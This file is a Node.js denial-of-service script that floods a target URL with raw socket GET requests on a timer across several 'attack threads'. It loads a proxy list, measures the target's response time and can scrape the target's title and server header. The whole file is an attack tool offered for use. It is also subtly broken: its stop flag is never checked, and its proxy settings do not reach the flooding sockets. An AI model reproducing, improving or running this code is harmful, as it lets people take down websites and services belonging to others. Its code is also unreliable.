const net = require('net');
const url = require('url');
const fs = require('fs');
const axios = require('axios');
const cheerio = require('cheerio');
const { HttpProxyAgent } = require('http-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');
const yargs = require('yargs');

const argv = yargs
    .option('port', {
        alias: 'p',
        describe: 'Port number',
        type: 'number',
        demandOption: true
    })
    .option('ai', {
        alias: 'a',
        describe: 'Enable site analysis',
        type: 'boolean',
        default: false
    })
    .option('proxy', {
        alias: 'x',
        describe: 'Path to proxy list file',
        type: 'string',
        demandOption: true
    })
    .option('debug', {
        alias: 'd',
        describe: 'Enable debug mode',
        type: 'boolean',
        default: false
    })
    .option('threads', {
        alias: 't',
        describe: 'Number of attack threads',
        type: 'number',
        default: 1
    })
    .help()
    .argv;

const targetUrl = argv._[0];
const duration = parseInt(argv._[1], 10);
const port = argv.port;
const aiEnabled = argv.ai;
const proxyListFile = argv.proxy;
const debug = argv.debug;
const threads = argv.threads;

if (isNaN(duration) || isNaN(threads)) {
    console.error('Invalid duration or threads');
    process.exit(1);
}

let proxies = [];
try {
    proxies = fs.readFileSync(proxyListFile, 'utf8').split('\n').filter(line => line.trim() !== '');
} catch (err) {
    console.error('Error reading proxy list:', err.message);
    process.exit(1);
}

if (proxies.length === 0) {
    console.error('No proxies found in the proxy list.');
    process.exit(1);
}

let STOP = false;
let optimalRateLimit = 100; // Default rate limit

if (debug) {
    console.log('--> Debug mode enabled');
    console.log('Target:', targetUrl);
    console.log('Port:', port);
    console.log('Duration:', duration);
    console.log('Threads:', threads);
    console.log('Proxy List File:', proxyListFile);
    console.log('AI Enabled:', aiEnabled);
}

function getRandomProxy() {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const [address, port] = proxy.split(':');
    return {
        address,
        port
    };
}

async function testRateLimits() {
    const { address, port } = getRandomProxy();
    const agent = targetUrl.startsWith('https') ? new HttpsProxyAgent(`https://${address}:${port}`) : new HttpProxyAgent(`http://${address}:${port}`);

    const rateLimits = [10, 50, 100, 200, 500];
    const times = [];

    for (const rateLimit of rateLimits) {
        try {
            const start = Date.now();
            await axios.get(targetUrl, { httpAgent: agent, httpsAgent: agent });
            const end = Date.now();
            times.push({ rateLimit, time: end - start });
        } catch (error) {
            if (debug) console.error('Error testing rate limit:', error.message);
            times.push({ rateLimit, time: Infinity });
        }
    }

    const bestRateLimit = times.reduce((prev, curr) => curr.time < prev.time ? curr : prev);
    optimalRateLimit = bestRateLimit.rateLimit;
    console.log(`Optimal rate limit: ${optimalRateLimit}`);
}

async function analyzeSite(target) {
    const { address, port } = getRandomProxy();
    const agent = target.startsWith('https') ? new HttpsProxyAgent(`https://${address}:${port}`) : new HttpProxyAgent(`http://${address}:${port}`);

    try {
        const response = await axios.get(target, { httpAgent: agent, httpsAgent: agent });
        const $ = cheerio.load(response.data);
        const title = $('title').text();
        const metaDescription = $('meta[name="description"]').attr('content') || 'No description';
        const server = response.headers['server'];
        const contentType = response.headers['content-type'];

        console.log('Site Analysis:');
        console.log('Title:', title);
        console.log('Meta Description:', metaDescription);
        console.log('Server:', server);
        console.log('Content-Type:', contentType);

        if (debug) {
            console.log('Status Code:', response.status);
            console.log('Response Time:', response.headers['x-response-time'] || 'N/A');
        }
    } catch (error) {
        console.error('Error analyzing site:', error.message);
        if (debug) {
            console.error('Error Details:', error);
        }
    }
}

function createFlood(targetUrl, port) {
    const { address, port: proxyPort } = getRandomProxy();
    const agent = targetUrl.startsWith('https') ? new HttpsProxyAgent(`https://${address}:${proxyPort}`) : new HttpProxyAgent(`http://${address}:${proxyPort}`);

    const options = {
        port: parseInt(port, 10),
        host: url.parse(targetUrl).hostname,
        agent
    };

    function sendRequest(socket) {
        const path = url.parse(targetUrl).path || '/';
        const request = `GET ${path} HTTP/1.1\r\n` +
            `Host: ${url.parse(targetUrl).hostname}\r\n` +
            `Connection: keep-alive\r\n` +
            `Accept: */*\r\n\r\n`;

        socket.write(request);
        socket.end();
    }

    function createSocket() {
        const socket = net.createConnection(options);
        socket.on('connect', () => {
            sendRequest(socket);
            if (debug) {
                console.log('Socket connected to:', options.host);
            }
        });
        socket.on('error', (err) => {
            if (debug) console.error('Socket error:', err.message);
        });
    }

    for (let i = 0; i < threads; i++) {
        setInterval(createSocket, 1000 / optimalRateLimit);
    }
}

if (aiEnabled) {
    analyzeSite(targetUrl).then(() => {
        createFlood(targetUrl, port);
    });
} else {
    createFlood(targetUrl, port);
}

setTimeout(() => { STOP = true; }, duration * 1000);
